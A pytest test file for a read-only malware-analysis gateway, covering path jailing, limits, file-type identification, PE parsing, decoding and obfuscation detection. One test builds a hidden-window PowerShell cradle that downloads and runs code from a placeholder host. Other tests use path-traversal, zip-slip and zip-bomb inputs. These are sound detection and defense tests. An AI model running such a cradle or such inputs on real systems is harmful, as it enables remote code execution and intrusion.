"""Tests of the DevGateway. All samples are harmless, synthetic data built in the tests."""
from __future__ import annotations

import ast
import base64
import gzip
import hashlib
import io
import os
import random
import struct
import zipfile
from pathlib import Path

import pytest

from sw_analyst.gateway import dev_gateway as dg_module
from sw_analyst.gateway.base import ToolError
from sw_analyst.gateway.dev_gateway import DevGateway
from sw_analyst.gateway.dev_tools.pe import parse_pe
from sw_analyst.gateway.dev_tools.regex_guard import check_pattern

JOB = "job1"


# ------------------------------------------------------------------ helpers
@pytest.fixture()
def gw(tmp_path: Path) -> DevGateway:
    return DevGateway(tmp_path)


def put(gw: DevGateway, data: bytes, job: str = JOB) -> str:
    gw.store_sample(job, data)
    return job


def run(gw: DevGateway, data: bytes, tool: str, args: dict | None = None, job: str = JOB):
    if not (gw._jobs / job / "sample").exists():
        put(gw, data, job)
    return gw.call(job, tool, args or {})


def make_zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, body in entries.items():
            zf.writestr(name, body)
    return buf.getvalue()


def build_pe(overlay: bytes = b"OVERLAY-DATA-1234") -> bytes:
    """Minimal PE32 with .text/.rdata/.data and one import (KERNEL32.dll!ExitProcess)."""
    buf = bytearray(0x800)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x14C, 3, 0x5F000000, 0, 0, 0xE0, 0x0102)
    o = 0x98  # optional header
    struct.pack_into("<H", buf, o, 0x10B)
    struct.pack_into("<I", buf, o + 16, 0x1010)       # entry RVA
    struct.pack_into("<I", buf, o + 28, 0x400000)     # image base
    struct.pack_into("<I", buf, o + 32, 0x1000)       # section alignment
    struct.pack_into("<I", buf, o + 36, 0x200)        # file alignment
    struct.pack_into("<I", buf, o + 56, 0x4000)       # size of image
    struct.pack_into("<I", buf, o + 60, 0x200)        # size of headers
    struct.pack_into("<H", buf, o + 68, 3)            # subsystem CUI
    struct.pack_into("<I", buf, o + 92, 16)           # number of data dirs
    struct.pack_into("<II", buf, o + 96 + 8, 0x2000, 0x40)   # import directory
    sec = 0x98 + 0xE0
    heads = [
        (b".text", 0x100, 0x1000, 0x200, 0x200, 0x60000020),
        (b".rdata", 0x200, 0x2000, 0x200, 0x400, 0x40000040),
        (b".data", 0x100, 0x3000, 0x200, 0x600, 0xC0000040),
    ]
    for i, (nm, vs, va, rs, rp, ch) in enumerate(heads):
        struct.pack_into("<8sIIIIIIHHI", buf, sec + 40 * i, nm, vs, va, rs, rp, 0, 0, 0, 0, ch)
    buf[0x200:0x400] = b"\x90" * 0x200
    # import data inside .rdata (file offset 0x400 == RVA 0x2000)
    struct.pack_into("<IIIII", buf, 0x400, 0x2060, 0, 0, 0x2040, 0x2060)
    buf[0x440:0x440 + 13] = b"KERNEL32.dll\x00"
    struct.pack_into("<II", buf, 0x460, 0x2080, 0)
    buf[0x480:0x480 + 2] = b"\x00\x00"
    buf[0x482:0x482 + 12] = b"ExitProcess\x00"
    buf[0x600:0x800] = bytes(random.Random(7).randrange(256) for _ in range(0x200))
    return bytes(buf) + overlay


# ------------------------------------------------------------------ contract basics
def test_list_tools_contract(gw):
    tools = {t.name: t for t in gw.list_tools()}
    expected = {"sample_info", "hash_file", "identify_type", "entropy_map", "strings_extract", "hexdump",
                "read_lines", "grep", "script_detect", "decode_layer", "pe_headers", "zip_list",
                "zip_read_text"}
    assert expected <= set(tools)
    for t in tools.values():
        assert t.read_only is True
        for spec in t.params.values():
            assert spec["type"] in ("int", "str", "bool")
            assert isinstance(spec["required"], bool)
            assert isinstance(spec["description"], str) and spec["description"]
            assert "default" in spec
    assert tools["grep"].params["pattern"]["required"] is True


def test_sample_path_and_job_id(gw):
    assert gw.sample_path("abc_1-2").replace("\\", "/").endswith("jobs/abc_1-2/sample")
    for bad in ("", "../x", "a/b", "a b", "x" * 65, "ä"):
        with pytest.raises(ToolError):
            gw.sample_path(bad)
    r = gw.call("../etc", "sample_info", {})
    assert r.ok is False and "job id" in r.error.lower()
    r = gw.call("nojob", "sample_info", {})
    assert r.ok is False and "unknown job" in r.error.lower()


def test_unknown_tool_and_arguments(gw):
    put(gw, b"hello")
    r = gw.call(JOB, "rm_rf", {})
    assert not r.ok and "Unknown tool" in r.error
    r = gw.call(JOB, "hexdump", {"bogus": 1})
    assert not r.ok and "Unknown argument" in r.error
    r = gw.call(JOB, "grep", {})
    assert not r.ok and "Missing required" in r.error
    r = gw.call(JOB, "hexdump", {"offset": "abc"})
    assert not r.ok and "integer" in r.error
    r = gw.call(JOB, "hexdump", {"offset": True})
    assert not r.ok
    r = gw.call(JOB, "grep", {"pattern": 5})
    assert not r.ok and "string" in r.error
    r = gw.call(JOB, "sample_info", "notadict")  # type: ignore[arg-type]
    assert not r.ok
    r = gw.call(JOB, "grep", {"pattern": "a\x00b"})
    assert not r.ok and "NUL" in r.error
    assert r.tool_version == "dev-1"


# ------------------------------------------------------------------ path jail
JAIL_PATHS = [
    "../outside", "derived/../sample", "derived/../../x", "..", "/etc/passwd", "/sample",
    "C:\\Windows\\win.ini", "C:/Windows/win.ini", "c:sample", "\\\\server\\share\\file", "//server/share",
    "derived\\layer01.bin", "derived/..\\sample", "sample\x00", "sample\x00.txt", "x" * 300,
    "derived/sub/file", "derived/", "derived", "other", "derived/CON", "derived/NUL.txt", "sample::$DATA",
    "./sample", "derived/.hidden", "",
]


@pytest.mark.parametrize("path", JAIL_PATHS)
def test_jail_rejects_host_paths(gw, path):
    put(gw, b"harmless sample data")
    for tool, args in (("hexdump", {"path": path}), ("hash_file", {"path": path}),
                       ("read_lines", {"path": path}), ("grep", {"path": path, "pattern": "x"}),
                       ("decode_layer", {"path": path, "method": "base64"})):
        r = gw.call(JOB, tool, args)
        assert r.ok is False, (tool, path)
        assert r.error
        assert str(gw._jobs) not in r.text  # no host paths leak
    with pytest.raises(ToolError):
        gw.read_file_lines(JOB, path)


def test_jail_symlink_escape(gw, tmp_path):
    put(gw, b"sample content")
    outside = tmp_path / "outside.txt"
    outside.write_text("TOP SECRET OUTSIDE", encoding="utf-8")
    derived = gw._jobs / JOB / "derived"
    link = derived / "evil.txt"
    try:
        os.symlink(outside, link)
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("symlinks not available on this system")
    r = gw.call(JOB, "read_lines", {"path": "derived/evil.txt"})
    assert not r.ok and "jail" in r.error.lower()
    assert "TOP SECRET" not in r.text
    r = gw.call(JOB, "hexdump", {"path": "derived/evil.txt"})
    assert not r.ok
    assert [f["path"] for f in gw.list_files(JOB)] == ["sample"]


def test_jail_sample_symlink_escape(gw, tmp_path):
    outside = tmp_path / "outside.bin"
    outside.write_bytes(b"outside data")
    root = gw._jobs / "linkjob"
    root.mkdir(parents=True)
    try:
        os.symlink(outside, root / "sample")
    except (OSError, NotImplementedError, AttributeError):
        pytest.skip("symlinks not available on this system")
    r = gw.call("linkjob", "sample_info", {})
    assert not r.ok and "jail" in r.error.lower()


def test_valid_derived_names_are_accepted(gw):
    put(gw, b"AAAA")
    derived = gw._jobs / JOB / "derived"
    derived.mkdir(exist_ok=True)
    (derived / "notes-1.txt").write_text("line one\nline two\n", encoding="utf-8")
    r = gw.call(JOB, "read_lines", {"path": "derived/notes-1.txt"})
    assert r.ok and "line two" in r.text
    r = gw.call(JOB, "read_lines", {"path": "derived/missing.txt"})
    assert not r.ok and "not found" in r.error.lower()


# ------------------------------------------------------------------ limits
def test_sample_size_limit(gw):
    root = gw._jobs / "big"
    root.mkdir(parents=True)
    with open(root / "sample", "wb") as f:
        f.truncate(64 * 1024 * 1024 + 1)
    r = gw.call("big", "sample_info", {})
    assert not r.ok and "64 MiB" in r.error
    with pytest.raises(ToolError):
        gw.store_sample("big2", b"\x00" * (64 * 1024 * 1024 + 1))


def test_output_truncation(gw):
    data = b"\n".join(b"string_number_%06d_with_padding_text" % i for i in range(3000))
    r = run(gw, data, "strings_extract", {"min_len": 8, "max_results": 2000})
    assert r.ok and r.truncated is True
    assert len(r.text) <= dg_module.MAX_OUTPUT_CHARS
    assert "truncated" in r.text.lower()


def test_numeric_arguments_are_clamped(gw):
    lines = "\n".join(f"line {i}" for i in range(1, 1001)).encode()
    put(gw, lines)
    r = gw.call(JOB, "read_lines", {"start": 1, "end": 100000})
    assert r.ok
    assert "lines 1-400 of 1000" in r.text
    assert r.meta["source_ref"] == {"file": "sample", "line_start": 1, "line_end": 400}
    assert "line 401" not in r.text
    r = gw.call(JOB, "hexdump", {"offset": 0, "length": 99999})
    assert r.ok and r.meta["source_ref"]["length"] == 512
    assert "clamped" in r.text
    r = gw.call(JOB, "hexdump", {"offset": -5, "length": 16})
    assert r.ok and r.meta["source_ref"]["offset"] == 0
    r = gw.call(JOB, "hexdump", {"offset": 10_000_000})
    assert not r.ok and "beyond" in r.error


def test_redos_patterns_rejected(gw):
    put(gw, ("a" * 40 + "!\nneedle here\n").encode())
    for pat in ("(a+)+$", "(a*)*b", "(x+x+)+y", "(.*)*", "(a|aa)+$", "(\\w+\\s?)*$", "((a+))+", "x" * 201,
                "a*a*a*a*a*a*"):
        r = gw.call(JOB, "grep", {"pattern": pat})
        assert not r.ok, pat
        assert "rejected" in r.error.lower() or "too long" in r.error.lower(), (pat, r.error)
    r = gw.call(JOB, "grep", {"pattern": "(unclosed"})
    assert not r.ok and "invalid" in r.error.lower()
    for pat in ("needle", "(foo|bar)+", "a{2,5}", "^a+!$", "need(le)?"):
        assert gw.call(JOB, "grep", {"pattern": pat}).ok, pat
    with pytest.raises(ToolError):
        check_pattern("(a+)+")


def test_grep_results_context_and_limits(gw):
    text = "\n".join(["alpha", "beta", "NEEDLE one", "gamma", "delta", "epsilon", "needle two", "zeta"])
    put(gw, text.encode())
    r = gw.call(JOB, "grep", {"pattern": "needle", "ignore_case": True, "context": 1})
    assert r.ok
    assert "     3: NEEDLE one" in r.text
    assert "     2- beta" in r.text and "     4- gamma" in r.text
    assert "     7: needle two" in r.text
    assert "--" in r.text  # gap between context groups
    assert r.meta["matches"] == [3, 7]
    assert r.meta["source_ref"] == {"file": "sample", "line_start": 3, "line_end": 7}
    r = gw.call(JOB, "grep", {"pattern": "needle"})
    assert r.meta["matches"] == [7]
    r = gw.call(JOB, "grep", {"pattern": "e", "max_results": 2})
    assert r.ok and r.truncated and len(r.meta["matches"]) == 2
    r = gw.call(JOB, "grep", {"pattern": "nomatchatall"})
    assert r.ok and "No matches" in r.text


def test_text_tools_refuse_binary(gw):
    r = run(gw, build_pe(), "read_lines")
    assert not r.ok and "hexdump" in r.error
    assert gw.call(JOB, "grep", {"pattern": "x"}).ok is False
    assert gw.call(JOB, "script_detect", {}).ok is False


def test_read_lines_numbers_and_utf16(gw):
    put(gw, "first\r\nsecond\r\nthird\r\n".encode("utf-16"))
    r = gw.call(JOB, "read_lines", {"start": 2, "end": 3})
    assert r.ok
    assert "     2 | second" in r.text and "     3 | third" in r.text
    assert "first" not in r.text
    r = gw.call(JOB, "read_lines", {"start": 50})
    assert not r.ok and "beyond" in r.error


# ------------------------------------------------------------------ identify_type
def _id(gw, data, job):
    r = run(gw, data, "identify_type", job=job)
    assert r.ok, r.error
    return r


def test_identify_binary_formats(gw):
    pe = build_pe()
    r = _id(gw, pe, "pe")
    assert r.meta["type"] == "pe" and "PE" in r.text and "MZ" in r.text
    elf = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8 + struct.pack("<HH", 2, 62) + b"\x00" * 64
    r = _id(gw, elf, "elf")
    assert r.meta["type"] == "elf" and "64-bit" in r.text and "x86-64" in r.text
    r = _id(gw, make_zip({"a.txt": b"hello"}), "zip")
    assert r.meta["type"] == "zip"
    apk = make_zip({"AndroidManifest.xml": b"\x03\x00\x08\x00", "classes.dex": b"dex\n035\x00" + b"\x00" * 32})
    r = _id(gw, apk, "apk")
    assert r.meta["type"] == "apk" and "AndroidManifest.xml" in r.text
    only_dex = make_zip({"classes.dex": b"dex\n035\x00"})
    assert _id(gw, only_dex, "notapk").meta["type"] == "zip"
    jar = make_zip({"META-INF/MANIFEST.MF": b"Manifest-Version: 1.0\n", "A.class": b"\xca\xfe\xba\xbe\x00\x00\x00\x34"})
    assert _id(gw, jar, "jar").meta["type"] == "jar"
    assert _id(gw, b"dex\n035\x00" + b"\x00" * 40, "dex").meta["type"] == "dex"
    assert _id(gw, b"%PDF-1.7\n1 0 obj\n", "pdf").meta["type"] == "pdf"
    assert _id(gw, b"\xcf\xfa\xed\xfe" + b"\x07\x00\x00\x01" + b"\x00" * 40, "macho").meta["type"] == "macho"
    assert _id(gw, gzip.compress(b"x" * 100), "gz").meta["type"] == "gzip"
    assert _id(gw, b"7z\xbc\xaf\x27\x1c\x00\x04" + b"\x00" * 20, "sevenz").meta["type"] == "7z"
    assert _id(gw, b"Rar!\x1a\x07\x00" + b"\x00" * 20, "rar").meta["type"] == "rar"
    assert _id(gw, b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 40, "ole").meta["type"] == "ole2"
    # Java class shares the 'CAFEBABE' magic with fat Mach-O; meta stays inside the allowed vocabulary
    r = _id(gw, b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\x00" * 20, "cls")
    assert r.meta["type"] in {"unknown", "macho"}
    assert _id(gw, random.Random(1).randbytes(600), "rnd").meta["type"] == "unknown"
    assert _id(gw, b"", "empty").meta["type"] == "unknown"


def test_mz_without_pe_signature(gw):
    r = _id(gw, b"MZ" + b"\x00" * 100, "mzonly")
    assert r.meta["type"] == "pe" and r.meta["confidence"] == "low"


SCRIPTS = {
    "powershell": b"Write-Host 'hi'\n$x = Get-Content foo.txt\n",
    "vbscript": b'Dim a\nSet o = CreateObject("Scripting.FileSystemObject")\nMsgBox "x"\n',
    "javascript": b"var a = 1;\nfunction f(x) { return x; }\nconsole.log(f(a));\n",
    "python": b"import os\n\ndef main():\n    print(os.getcwd())\n",
    "bash": b"#!/bin/bash\necho hello\n",
    "batch": b"@echo off\nset X=1\ngoto :end\n",
    "html": b"<!DOCTYPE html><html><body><div>x</div></body></html>",
    "text": b"just a short note written by a human, nothing special here\n",
}


@pytest.mark.parametrize("lang", sorted(SCRIPTS))
def test_identify_scripts(gw, lang):
    r = run(gw, SCRIPTS[lang], "identify_type", job=f"s_{lang}")
    assert r.ok
    assert r.meta["type"] == lang, r.text
    assert "Evidence" in r.text


def test_identify_shebang_python(gw):
    r = run(gw, b"#!/usr/bin/env python3\nprint(1)\n", "identify_type")
    assert r.meta["type"] == "python" and "shebang" in r.text.lower()


# ------------------------------------------------------------------ pe_headers
def test_pe_headers_minimal_pe(gw):
    r = run(gw, build_pe(), "pe_headers")
    assert r.ok, r.error
    t = r.text
    assert "PE32" in t and "I386" in t
    assert "WINDOWS_CUI" in t
    assert "EntryPoint RVA: 0x1010" in t
    assert "ImageBase: 0x400000" in t
    for sec in (".text", ".rdata", ".data"):
        assert sec in t
    assert "KERNEL32.dll" in t and "ExitProcess" in t
    assert "Overlay: offset 0x800, size 17" in t
    assert "2017-07-" in t or "2020-" in t or "UTC" in t
    assert r.meta["sections"] == [".text", ".rdata", ".data"]
    assert r.meta["overlay_offset"] == 0x800
    info = parse_pe(build_pe())
    assert info["imports"] == [{"dll": "KERNEL32.dll", "functions": ["ExitProcess"]}]
    assert info["sections"][0]["rwx"] == "R-X" and info["sections"][2]["rwx"] == "RW-"
    assert info["sections"][0]["entropy"] == 0.0 and info["sections"][2]["entropy"] > 7.0


def test_pe_headers_garbage_never_raises(gw):
    rnd = random.Random(3)
    for i in range(5):
        junk = b"MZ" + bytes(rnd.randrange(256) for _ in range(rnd.randrange(0, 600)))
        r = run(gw, junk, "pe_headers", job=f"junk{i}")
        assert r.ok is False and r.error
    r = run(gw, b"not a pe at all", "pe_headers", job="junk_text")
    assert not r.ok and "Not a valid PE" in r.error
    r = run(gw, b"", "pe_headers", job="junk_empty")
    assert not r.ok
    # e_lfanew points beyond the file
    bad = bytearray(b"MZ" + b"\x00" * 100)
    struct.pack_into("<I", bad, 0x3C, 0xFFFFFFF0)
    assert not run(gw, bytes(bad), "pe_headers", job="junk_lfanew").ok


def test_pe_parser_fuzz_mutations():
    base = bytearray(build_pe())
    rnd = random.Random(99)
    for _ in range(400):
        data = bytearray(base)
        for _ in range(rnd.randrange(1, 12)):
            data[rnd.randrange(len(data))] = rnd.randrange(256)
        if rnd.random() < 0.3:
            data = data[:rnd.randrange(0x40, len(data))]
        info = parse_pe(bytes(data))
        assert isinstance(info, dict) and "is_pe" in info


def test_pe_headers_mutated_through_gateway(gw):
    base = bytearray(build_pe())
    rnd = random.Random(5)
    for i in range(30):
        data = bytearray(base)
        for _ in range(rnd.randrange(1, 10)):
            data[rnd.randrange(0x40, 0x600)] = rnd.randrange(256)
        r = run(gw, bytes(data), "pe_headers", job=f"mut{i}")
        assert r.tool_version == "dev-1"
        assert isinstance(r.ok, bool)


# ------------------------------------------------------------------ decode_layer
FLAG = b"FLAG{layered_ok}"


def test_decode_layer_base64_chain(gw):
    layer0 = base64.b64encode(base64.b64encode(FLAG))
    put(gw, layer0)
    r1 = gw.call(JOB, "decode_layer", {"method": "base64"})
    assert r1.ok, r1.error
    assert r1.meta["derived"] == "derived/layer01.bin"
    assert r1.meta["sha256"] == hashlib.sha256(base64.b64encode(FLAG)).hexdigest()
    assert r1.meta["source_ref"] == {"file": "sample", "offset": 0, "length": len(layer0)}
    f1 = gw._jobs / JOB / "derived" / "layer01.bin"
    assert f1.read_bytes() == base64.b64encode(FLAG)
    r2 = gw.call(JOB, "decode_layer", {"method": "base64", "path": "derived/layer01.bin"})
    assert r2.ok and r2.meta["derived"] == "derived/layer02.bin"
    assert "FLAG{layered_ok}" in r2.text
    assert (gw._jobs / JOB / "derived" / "layer02.bin").read_bytes() == FLAG
    assert r2.meta["result_kind"] == "text"
    if os.name != "nt":
        assert not (gw._jobs / JOB / "derived" / "layer02.bin").stat().st_mode & 0o111
    files = {f["path"]: f for f in gw.list_files(JOB)}
    assert set(files) == {"sample", "derived/layer01.bin", "derived/layer02.bin"}
    assert files["derived/layer02.bin"]["kind"] == "derived"
    assert files["derived/layer02.bin"]["sha256"] == hashlib.sha256(FLAG).hexdigest()
    # the result is readable like any other file
    assert "FLAG{layered_ok}" in gw.call(JOB, "read_lines", {"path": "derived/layer02.bin"}).text


def test_decode_layer_auto_chain(gw):
    put(gw, base64.b64encode(base64.b64encode(FLAG)))
    r1 = gw.call(JOB, "decode_layer", {"method": "auto"})
    assert r1.ok and r1.meta["method"] == "base64" and r1.meta["derived"] == "derived/layer01.bin"
    assert "Auto-detection candidates" in r1.text and "score" in r1.text
    assert r1.meta["candidates"][0]["method"] == "base64"
    r2 = gw.call(JOB, "decode_layer", {"method": "auto", "path": "derived/layer01.bin"})
    assert r2.ok and r2.meta["method"] == "base64"
    assert "FLAG{layered_ok}" in r2.text
    assert (gw._jobs / JOB / "derived" / "layer02.bin").read_bytes() == FLAG


def test_decode_layer_auto_other_methods(gw):
    r = run(gw, FLAG.hex().encode(), "decode_layer", {"method": "auto"}, job="hexjob")
    assert r.ok and r.meta["method"] == "hex" and "FLAG{layered_ok}" in r.text
    r = run(gw, b"FLAG%7Blayered_ok%7D", "decode_layer", {"method": "auto"}, job="urljob")
    assert r.ok and r.meta["method"] == "url"
    r = run(gw, gzip.compress(FLAG * 3), "decode_layer", {"method": "auto"}, job="gzjob")
    assert r.ok and r.meta["method"] == "gzip" and "FLAG{layered_ok}" in r.text
    import zlib
    r = run(gw, zlib.compress(FLAG * 3), "decode_layer", {"method": "auto"}, job="zjob")
    assert r.ok and r.meta["method"] == "zlib"
    r = run(gw, b"SYNT{ynlrerq_bx}", "decode_layer", {"method": "rot13"}, job="rotjob")
    assert r.ok and "FLAG{layered_ok}" in r.text
    # decoded PE is recognized by its magic (data only, never run)
    r = run(gw, base64.b64encode(build_pe()), "decode_layer", {"method": "auto"}, job="pejob")
    assert r.ok and r.meta["magic"] == "pe/mz" and r.meta["result_kind"] == "binary"
    assert "Preview" in r.text and "4d 5a" in r.text


def test_decode_layer_auto_no_plausible_result(gw):
    r = run(gw, random.Random(2).randbytes(300), "decode_layer", {"method": "auto"}, job="noise")
    assert not r.ok and "no plausible" in r.error.lower()
    assert not (gw._jobs / "noise" / "derived").exists()


def test_decode_layer_errors(gw):
    put(gw, b"not base64 !!! ***")
    r = gw.call(JOB, "decode_layer", {"method": "base64"})
    assert not r.ok and "base64" in r.error
    r = gw.call(JOB, "decode_layer", {"method": "hex"})
    assert not r.ok
    r = gw.call(JOB, "decode_layer", {"method": "shell"})
    assert not r.ok and "Unknown method" in r.error
    r = gw.call(JOB, "decode_layer", {})
    assert not r.ok and "method" in r.error
    r = gw.call(JOB, "decode_layer", {"method": "gzip"})
    assert not r.ok
    r = gw.call(JOB, "decode_layer", {"method": "base64", "offset": 9999})
    assert not r.ok and "beyond" in r.error


def test_decode_layer_offset_length(gw):
    blob = b"JUNKJUNK" + base64.b64encode(FLAG) + b"TRAILER"
    put(gw, blob)
    r = gw.call(JOB, "decode_layer", {"method": "base64", "offset": 8, "length": len(base64.b64encode(FLAG))})
    assert r.ok and "FLAG{layered_ok}" in r.text
    assert r.meta["source_ref"]["offset"] == 8


def test_decode_layer_identical_result_is_reused(gw):
    put(gw, base64.b64encode(FLAG))
    a = gw.call(JOB, "decode_layer", {"method": "base64"})
    b = gw.call(JOB, "decode_layer", {"method": "base64"})
    assert a.meta["derived"] == b.meta["derived"] == "derived/layer01.bin"
    assert len(os.listdir(gw._jobs / JOB / "derived")) == 1


def test_decode_layer_zip_bomb_limited(gw):
    import zlib
    bomb = zlib.compress(b"\x00" * (9 * 1024 * 1024), 9)
    assert len(bomb) < 100_000
    r = run(gw, bomb, "decode_layer", {"method": "zlib"}, job="bomb")
    assert not r.ok and "8 MiB" in r.error
    r = run(gw, gzip.compress(b"\x00" * (9 * 1024 * 1024)), "decode_layer", {"method": "gzip"}, job="bomb2")
    assert not r.ok and "8 MiB" in r.error


def test_decode_layer_utf16_powershell_encoded_command(gw):
    # PowerShell -EncodedCommand carries Base64 of UTF-16LE text; we only decode it
    enc = base64.b64encode("Write-Host 'harmless'".encode("utf-16le"))
    r = run(gw, enc, "decode_layer", {"method": "base64"}, job="ps")
    assert r.ok and "UTF-16LE" in r.text and "Write-Host 'harmless'" in r.text


def test_xor_single_byte(gw):
    plain = (b"The quick brown fox jumps over the lazy dog. FLAG{xor_ok} " * 4)
    enc = bytes(b ^ 0x5A for b in plain)
    r = run(gw, enc, "decode_layer", {"method": "xor_single_byte"})
    assert r.ok, r.error
    assert r.meta["xor_key"] == 0x5A
    assert "FLAG{xor_ok}" in r.text
    assert "key 0x5a" in r.text
    assert (gw._jobs / JOB / "derived" / "layer01.bin").read_bytes() == plain
    # explicit wrong key yields different data but still works; key 0 is refused
    r = gw.call(JOB, "decode_layer", {"method": "xor_single_byte", "key": 0x41})
    assert r.ok and r.meta["xor_key"] == 0x41
    r = gw.call(JOB, "decode_layer", {"method": "xor_single_byte", "key": 0})
    assert not r.ok
    r = run(gw, enc, "decode_layer", {"method": "auto"}, job="xorauto")
    assert r.ok and r.meta["method"] == "xor_single_byte" and "FLAG{xor_ok}" in r.text


# ------------------------------------------------------------------ entropy / strings
def test_entropy_random_vs_zeros(gw):
    zeros = b"\x00" * 8192
    rnd = random.Random(42).randbytes(8192)
    r = run(gw, zeros + rnd, "entropy_map", {"block_size": 4096})
    assert r.ok
    assert r.meta["high_entropy_regions"] == [[8192, 16384]]
    assert "0x00002000 - 0x00004000" in r.text
    rows = [ln for ln in r.text.splitlines() if ln.startswith("0x0000") and "  " in ln and "-" not in ln]
    assert any(" 0.000 " in ln for ln in rows)
    assert any(" 7.9" in ln for ln in rows)
    r0 = run(gw, zeros, "entropy_map", {"block_size": 4096}, job="zeros")
    assert r0.meta["overall_entropy"] == 0.0 and r0.meta["high_entropy_regions"] == []
    assert "none" in r0.text
    r1 = run(gw, rnd, "entropy_map", {"block_size": 1024}, job="rnd")
    assert r1.meta["overall_entropy"] > 7.9
    assert run(gw, b"", "entropy_map", job="emptyent").ok


def test_entropy_row_grouping_for_many_blocks(gw):
    r = run(gw, random.Random(1).randbytes(300_000), "entropy_map", {"block_size": 64})
    assert r.ok
    assert "group" in r.text.lower()
    assert len(r.text) <= dg_module.MAX_OUTPUT_CHARS


def test_strings_extract_ascii_and_utf16(gw):
    data = b"\x00\x01" + "SecretUtf16Text".encode("utf-16le") + b"\xff\xfe\xfd" + b"plain_ascii_string" + b"\x00ab\x00"
    r = run(gw, data, "strings_extract", {"min_len": 6})
    assert r.ok
    assert "0x00000002  W    SecretUtf16Text" in r.text
    assert "A    plain_ascii_string" in r.text
    assert r.text.index("SecretUtf16Text") < r.text.index("plain_ascii_string")  # sorted by offset
    r = gw.call(JOB, "strings_extract", {"min_len": 6, "encoding": "ascii"})
    assert "plain_ascii_string" in r.text and "SecretUtf16Text" not in r.text
    r = gw.call(JOB, "strings_extract", {"min_len": 6, "encoding": "utf16le"})
    assert "SecretUtf16Text" in r.text and "plain_ascii_string" not in r.text
    r = gw.call(JOB, "strings_extract", {"encoding": "ebcdic"})
    assert not r.ok
    r = gw.call(JOB, "strings_extract", {"min_len": 3, "max_results": 1})
    assert r.ok and r.truncated and "continue with offset=" in r.text


# ------------------------------------------------------------------ hexdump / hashes / info
def test_hexdump_hash_and_sample_info(gw):
    data = bytes(range(256)) * 2
    r = run(gw, data, "hexdump", {"offset": 16, "length": 32})
    assert r.ok
    assert "00000010  10 11 12 13 14 15 16 17  18 19 1a 1b 1c 1d 1e 1f" in r.text
    assert r.meta["source_ref"] == {"file": "sample", "offset": 16, "length": 32}
    info = gw.call(JOB, "sample_info", {})
    assert info.ok
    assert hashlib.sha256(data).hexdigest() in info.text
    assert hashlib.md5(data).hexdigest() in info.text
    assert hashlib.sha1(data).hexdigest() in info.text
    assert "00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f" in info.text
    assert f"{len(data)} bytes" in info.text
    h = gw.call(JOB, "hash_file", {"path": "sample"})
    assert h.ok and h.meta["sha256"] == hashlib.sha256(data).hexdigest()


# ------------------------------------------------------------------ script_detect
def test_script_detect_powershell_indicators(gw):
    blob = base64.b64encode(os.urandom(0) + bytes(range(256)) * 2).decode()
    script = (f"powershell -nop -w hidden -EncodedCommand {blob}\n"
              "$b = [System.Convert]::FromBase64String($s)\n"
              "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/x')\n"
              "$x = " + " + ".join(f"'a{i}'" for i in range(14)) + "\n")
    r = run(gw, script.encode(), "script_detect")
    assert r.ok, r.error
    assert "Language: powershell" in r.text
    for ind in ("base64_blob", "encoded_command", "frombase64string", "invoke_expression",
                "download_api", "hidden_window"):
        assert ind in r.text, ind
    assert "L1: base64_blob" in r.text
    assert "L2: frombase64string" in r.text
    assert "L4: long_concatenation" in r.text
    assert r.meta["obfuscation_level"] == "high"
    assert r.meta["language"] == "powershell"


def test_script_detect_js_vbs_xor(gw):
    js = (b"var s = String.fromCharCode(72,101,108,108,111);\n"
          b"eval(atob('SGVsbG8='));\n"
          b"for (var i=0;i<s.length;i++) r += String.fromCharCode(s.charCodeAt(i) ^ 7);\n")
    r = run(gw, js, "script_detect", job="js")
    assert r.ok and "Language: javascript" in r.text
    for ind in ("fromcharcode", "eval", "atob", "xor_operation", "xor_loop"):
        assert ind in r.text, ind
    assert "L3: xor_loop" in r.text
    vbs = (b'Dim s\ns = Chr(72) & Chr(101) & Chr(108) & Chr(108) & Chr(111)\n'
           b'Set o = CreateObject("WScript.Shell")\n')
    r = run(gw, vbs, "script_detect", job="vbs")
    assert r.ok and "Language: vbscript" in r.text and "L2: chr_chain" in r.text
    assert "L3: exec_api" in r.text
    r = run(gw, b"plain text without anything\n", "script_detect", job="plain")
    assert r.ok and "No obfuscation indicators" in r.text


# ------------------------------------------------------------------ zip tools
def test_zip_list_and_read_text(gw):
    apk = make_zip({
        "AndroidManifest.xml": b"\x03\x00\x08\x00\x00\x00\x00\x00",
        "classes.dex": b"dex\n035\x00" + b"\x00" * 16,
        "META-INF/MANIFEST.MF": b"Manifest-Version: 1.0\nCreated-By: test\n",
        "res/raw/note.txt": b"hello\nworld\n",
    })
    r = run(gw, apk, "zip_list")
    assert r.ok
    assert "4 entries" in r.text
    assert "classes.dex" in r.text and "APK structure" in r.text
    crc = zlib_crc(b"hello\nworld\n")
    assert f"{crc:08x}" in r.text
    r = gw.call(JOB, "zip_read_text", {"member": "res/raw/note.txt"})
    assert r.ok and "     2 | world" in r.text
    r = gw.call(JOB, "zip_read_text", {"member": "classes.dex"})
    assert not r.ok and "binary" in r.error
    r = gw.call(JOB, "zip_read_text", {"member": "AndroidManifest.xml"})
    assert not r.ok and "binary" in r.error
    r = gw.call(JOB, "zip_read_text", {"member": "nope.txt"})
    assert not r.ok and "not found" in r.error
    r = gw.call(JOB, "zip_read_text", {"member": "META-INF/MANIFEST.MF", "max_chars": 10})
    assert r.ok and r.truncated and "Manifest-V" in r.text


def zlib_crc(b: bytes) -> int:
    import zlib
    return zlib.crc32(b) & 0xFFFFFFFF


def test_zip_member_traversal_rejected(gw):
    z = make_zip({"../evil.txt": b"payload", "ok.txt": b"fine", "/abs.txt": b"x"})
    r = run(gw, z, "zip_list")
    assert r.ok and "unsafe name" in r.text
    for member in ("../evil.txt", "/abs.txt", "a\\..\\b", "C:/x.txt", "dir/../ok.txt"):
        r = gw.call(JOB, "zip_read_text", {"member": member})
        assert not r.ok and "rejected" in r.error, member
    assert gw.call(JOB, "zip_read_text", {"member": "ok.txt"}).ok
